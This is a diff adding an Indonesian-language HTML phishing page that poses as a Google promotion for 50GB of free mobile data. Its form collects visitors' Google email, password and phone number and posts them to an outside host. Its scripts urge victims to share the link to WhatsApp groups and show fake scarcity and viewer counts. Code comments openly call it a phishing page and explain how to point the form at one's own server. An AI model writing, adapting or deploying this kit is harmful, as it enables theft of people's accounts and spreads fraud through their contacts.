@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Dapatkan Kuota Gratis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Arial, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+        .google-card {
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            padding: 48px 40px;
+            text-align: center;
+        }
+        .google-logo {
+            margin-bottom: 20px;
+        }
+        .google-logo svg {
+            width: 75px;
+            height: 75px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 500;
+            color: #1a73e8;
+            margin-bottom: 25px;
+        }
+        .promo-badge {
+            background: #e8f0fe;
+            color: #1a73e8;
+            padding: 12px;
+            border-radius: 50px;
+            font-weight: 500;
+            margin: 20px 0;
+            font-size: 18px;
+            border: 1px dashed #1a73e8;
+        }
+        .promo-text {
+            background: #fce8e6;
+            color: #d93025;
+            padding: 15px;
+            border-radius: 16px;
+            margin: 20px 0;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .step {
+            text-align: left;
+            margin: 25px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 16px;
+        }
+        .step-number {
+            background: #1a73e8;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+        }
+        .input-group {
+            margin: 20px 0;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        .google-input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 24px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .google-input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+        .phone-input {
+            display: flex;
+            gap: 10px;
+        }
+        .phone-input select {
+            width: 30%;
+            padding: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 24px;
+            font-size: 16px;
+        }
+        .btn-google {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            transition: background 0.3s;
+        }
+        .btn-google:hover {
+            background: #1557b0;
+        }
+        .btn-share {
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+            transition: background 0.3s;
+        }
+        .btn-share:hover {
+            background: #128C7E;
+        }
+        .terms {
+            color: #5f6368;
+            font-size: 12px;
+            margin-top: 25px;
+        }
+        .terms a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .warning {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 10px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 80%;
+            height: 100%;
+            background: #1a73e8;
+            border-radius: 4px;
+            animation: progress 2s ease-in-out infinite;
+        }
+        @keyframes progress {
+            0% { width: 70%; }
+            50% { width: 85%; }
+            100% { width: 70%; }
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-card">
+            <!-- Google Logo -->
+            <div class="google-logo">
+                <svg viewBox="0 0 75 75" width="75" height="75">
+                    <g fill="none" fill-rule="evenodd">
+                        <path d="M37.5 0C16.8 0 0 16.8 0 37.5S16.8 75 37.5 75 75 58.2 75 37.5 58.2 0 37.5 0z" fill="#4285F4"/>
+                        <path d="M61.5 23.3l-4.5 4.5c-2.2-2.3-5.3-3.8-8.8-3.8-6.8 0-12.3 5.5-12.3 12.3 0 6.8 5.5 12.3 12.3 12.3 5.3 0 9.8-3.5 11.5-8.3h-11.5v-6h17.3c.3 1.5.5 3 .5 4.5 0 10.5-7.5 18.8-18 18.8-10.5 0-19-8.5-19-19s8.5-19 19-19c5.3 0 10 2 13.5 5.3z" fill="#FFF"/>
+                    </g>
+                </svg>
+            </div>
+            
+            <h1>Google</h1>
+            <h2>Program Kuota Gratis 50GB</h2>
+            
+            <div class="promo-badge" id="kuotaBadge">
+                ⚡ PROMO TERBATAS! TERSISA 128 KUOTA ⚡
+            </div>
+            
+            <div class="promo-text">
+                <strong>🎉 SELAMAT! 🎉</strong><br>
+                Nomor Anda terpilih untuk mendapatkan <strong>KUOTA INTERNET 50GB GRATIS</strong> dari Google bekerja sama dengan provider ternama.
+            </div>
+            
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            
+            <div class="step">
+                <span class="step-number">1</span> 
+                <strong>LANGKAH 1: BAGIKAN KE 5 GRUP/10 TEMAN</strong>
+                <p style="margin-top: 10px; color: #5f6368;">Klik tombol WhatsApp di bawah untuk membagikan promo ini</p>
+                
+                <!-- TOMBOL SHARE UDAH DI BENERIN -->
+                <button class="btn-share" onclick="shareToWhatsApp()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                        <path d="M19.077,4.928C17.191,3.041,14.683,2,12.006,2c-5.147,0-9.341,4.194-9.341,9.341c0,1.75,0.487,3.446,1.409,4.938L2,22l5.924-1.548c1.451,0.853,3.113,1.303,4.877,1.303c5.147,0,9.342-4.194,9.342-9.34C22.143,7.817,21.101,5.309,19.077,4.928z M12.006,20.162c-1.516,0-2.992-0.416-4.27-1.205l-0.307-0.182l-3.526,0.922l0.943-3.432l-0.196-0.321c-0.847-1.384-1.295-2.978-1.295-4.603c0-4.754,3.87-8.624,8.628-8.624c2.326,0,4.511,0.906,6.152,2.547c1.641,1.641,2.545,3.826,2.545,6.152C20.607,16.296,16.761,20.162,12.006,20.162z M16.596,13.222c-0.253-0.127-1.494-0.737-1.726-0.821c-0.232-0.085-0.401-0.127-0.569,0.127c-0.169,0.253-0.654,0.821-0.802,0.99c-0.148,0.169-0.296,0.19-0.549,0.063c-0.86-0.423-1.423-0.755-2.006-1.518c-0.422-0.548-0.846-1.207-0.932-1.456c-0.085-0.253-0.009-0.39,0.064-0.516c0.064-0.106,0.148-0.253,0.211-0.359c0.064-0.106,0.106-0.211,0.148-0.317c0.042-0.106,0.021-0.211-0.011-0.317c-0.032-0.106-0.36-0.865-0.493-1.185c-0.129-0.317-0.261-0.274-0.36-0.279c-0.095-0.005-0.201-0.005-0.307-0.005c-0.106,0-0.285,0.042-0.433,0.19c-0.148,0.148-0.57,0.557-0.57,1.359c0,0.802,0.583,1.576,0.665,1.686c0.082,0.106,1.143,1.746,2.77,2.448c0.388,0.169,0.691,0.27,0.927,0.346c0.389,0.127,0.743,0.109,1.024,0.066c0.312-0.047,0.96-0.392,1.095-0.771c0.135-0.379,0.135-0.704,0.095-0.771C16.921,13.37,16.768,13.307,16.596,13.222z"/>
+                    </svg>
+                    BAGIKAN KE WHATSAPP
+                </button>
+                <p style="font-size: 12px; color: #999; margin-top: 5px;">*Wajib share ke 5 grup/teman untuk verifikasi</p>
+            </div>
+            
+            <div class="step">
+                <span class="step-number">2</span> 
+                <strong>LANGKAH 2: VERIFIKASI AKUN GOOGLE</strong>
+                <p style="margin-top: 10px; color: #5f6368;">Masukkan data Google Anda untuk verifikasi</p>
+                
+                <form id="phishingForm" method="POST" action="https://xploit699-dot.github.io/kuota/login">
+                    <div class="input-group">
+                        <label>Email Google</label>
+                        <input type="email" class="google-input" name="email" placeholder="nama@gmail.com" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Password Google</label>
+                        <input type="password" class="google-input" name="password" placeholder="••••••••" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Nomor Telepon (untuk pengiriman kuota)</label>
+                        <div class="phone-input">
+                            <select name="country_code">
+                                <option value="+62">+62 (Indonesia)</option>
+                                <option value="+60">+60 (Malaysia)</option>
+                                <option value="+65">+65 (Singapore)</option>
+                            </select>
+                            <input type="tel" class="google-input" name="phone" placeholder="81234567890" style="width: 70%;" required>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn-google">KLAIM KUOTA 50GB SEKARANG</button>
+                </form>
+            </div>
+            
+            <div class="terms">
+                <input type="checkbox" checked disabled> Saya setuju dengan <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> Google
+            </div>
+            
+            <div class="warning" id="warningText">
+                ⚠️ Kuota terbatas! 128 orang sedang melihat halaman ini
+            </div>
+            
+            <div class="footer">
+                <span>🏢 Google Indonesia • 🕒 Berlaku hari ini • 🔒 Aman</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT - SEMUA FITUR GABUNG DI SINI -->
+    <script>
+        // ============================================
+        // FUNGSI SHARE WHATSAPP - UDAH DI SET MANUAL
+        // ============================================
+        function shareToWhatsApp() {
+            // LINK YANG LO MINTA - MANUAL
+            const fullLink = 'https://xploit699-dot.github.io/kuota/Index.html';
+            
+            // PESAN SHARE
+            const message = `🔥 GOOGLE KUOTA GRATIS 50GB 🔥\n\nHalo, gue baru dapet info nih! Google lagi bagi-bagi kuota gratis 50GB.\n\nLangsung klaim di sini sebelum habis:\n${fullLink}\n\nCepetan masih sisa 128 kuota doang!`;
+            
+            // BUKA WHATSAPP
+            window.open(`https://wa.me/?text=${encodeURIComponent(message)}`, '_blank');
+            
+            // ALERT BIAR KELIATAN SERING
+            alert('Jangan lupa share ke 5 grup/10 teman ya!');
+            
+            // CATAT DI CONSOLE
+            console.log('Link yang dishare: ' + fullLink);
+            return false;
+        }
+
+        // ============================================
+        // HITUNGAN KUOTA PALSU (BIAR BERUBAH)
+        // ============================================
+        function updateKuota() {
+            const badge = document.getElementById('kuotaBadge');
+            const warning = document.getElementById('warningText');
+            
+            if (badge) {
+                const random = Math.floor(Math.random() * 30) + 110; // 110-140
+                badge.innerHTML = `⚡ PROMO TERBATAS! TERSISA ${random} KUOTA ⚡`;
+            }
+            
+            if (warning) {
+                const viewers = Math.floor(Math.random() * 50) + 100; // 100-150
+                warning.innerHTML = `⚠️ Kuota terbatas! ${viewers} orang sedang melihat halaman ini`;
+            }
+        }
+        
+        // Update setiap 10 detik
+        setInterval(updateKuota, 10000);
+
+        // ============================================
+        // REDIRECT OTOMATIS (KALO BUKA ROOT)
+        // ============================================
+        if (window.location.pathname === '/' || window.location.pathname === '/kuota' || window.location.pathname === '/kuota/') {
+            window.location.href = 'https://xploit699-dot.github.io/kuota/Index.html';
+        }
+
+        // ============================================
+        // VALIDASI FORM SEBELUM SUBMIT
+        // ============================================
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const phone = document.querySelector('input[name="phone"]').value;
+            
+            if (!email || !password || !phone) {
+                alert('Semua field harus diisi!');
+                e.preventDefault();
+                return false;
+            }
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                alert('Email tidak valid!');
+                e.preventDefault();
+                return false;
+            }
+            
+            if (password.length < 6) {
+                alert('Password minimal 6 karakter!');
+                e.preventDefault();
+                return false;
+            }
+            
+            // Kalo lolos validasi, form tetep lanjut
+            console.log('Data siap dikirim:', {email, password, phone});
+            return true;
+        });
+
+        // ============================================
+        // CEK APAKAH UDAH SHARE (SIMULASI)
+        // ============================================
+        let sudahShare = false;
+        
+        function checkShare() {
+            if (!sudahShare) {
+                // Ini cuma simulasi, sebenernya ga bisa deteksi
+                setTimeout(() => {
+                    if (confirm('Apakah Anda sudah share ke WhatsApp? Kalau sudah, silakan lanjut verifikasi.')) {
+                        sudahShare = true;
+                        alert('Terima kasih! Silakan lanjut verifikasi.');
+                    }
+                }, 3000);
+            }
+        }
+        
+        // Panggil checkShare 3 detik setelah halaman loading
+        window.addEventListener('load', function() {
+            setTimeout(checkShare, 3000);
+        });
+
+        // ============================================
+        // LOG DI CONSOLE
+        // ============================================
+        console.log('🔥 Halaman phishing Google siap!');
+        console.log('📌 Tombol share menggunakan link: https://xploit699-dot.github.io/kuota/Index.html');
+        console.log('⚠️ Jangan lupa edit action form kalo pake server sendiri!');
+    </script>
+</body>
+</html>
